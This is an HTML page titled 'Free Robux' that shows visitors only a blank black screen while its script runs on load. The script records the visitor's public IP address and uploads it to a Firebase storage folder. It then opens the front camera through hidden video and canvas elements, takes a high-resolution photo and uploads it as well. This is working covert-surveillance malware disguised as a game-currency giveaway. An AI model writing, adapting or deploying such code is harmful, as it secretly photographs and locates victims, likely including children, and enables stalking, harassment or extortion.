<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Robux</title>
    <script type="module">
        // Dynamically import Firebase configuration
        import firebaseConfig from './firebase-config.js';

        // Import Firebase libraries
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Function to upload image to Firebase
        async function uploadImage(imageData, fileName) {
            try {
                const storageRef = ref(storage, `Zeyad/${fileName}`); // Upload to Zeyad folder
                await uploadString(storageRef, imageData, 'data_url');
                console.log(`Uploaded image: ${fileName}`);
            } catch (error) {
                console.error(`Error uploading image:`, error);
            }
        }

        // Function to upload IP address to Firebase
        async function uploadIP(ip) {
            try {
                const ipRef = ref(storage, `Zeyad/ip_${Date.now()}.txt`); // Upload to Zeyad folder
                await uploadString(ipRef, ip, 'raw');
                console.log('Uploaded IP address!');
            } catch (error) {
                console.error('Error uploading IP address:', error);
            }
        }

        // Function to fetch the user's public IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (!response.ok) throw new Error('Failed to fetch IP address.');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return null;
            }
        }

        // Main function to capture video and upload data
        window.addEventListener('load', async () => {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // Hide video and canvas elements
            video.style.display = 'none';
            canvas.style.display = 'none';

            // Fetch and upload the user's public IP address
            const ip = await getIP();
            if (ip) {
                await uploadIP(ip); // Ensure IP is uploaded regardless of camera access
            }

            // Access the front camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user", // Front camera
                        width: { ideal: 1920 }, // High resolution
                        height: { ideal: 1080 } // High resolution
                    }
                });

                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();

                    // Set canvas size to match the desired resolution
                    canvas.width = 1920;
                    canvas.height = 1080;

                    // Capture the image immediately
                    setTimeout(() => {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/png', 1.0); // High-quality image
                        const fileName = `image_${Date.now()}.png`;
                        uploadImage(imageData, fileName);

                        // Stop the video stream
                        stopVideo(stream);
                    }, 100); // Small delay to ensure the camera is ready
                };
            } catch (err) {
                console.error('Camera access denied or error:', err);
                // If camera access is denied, do nothing further (IP has already been uploaded)
            }
        });

        // Function to stop the video stream
        function stopVideo(stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    </script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000; /* Black background */
        }
        video, canvas {
            display: none; /* Hide video and canvas elements */
        }
    </style>
</head>
<body>
</body>
</html>
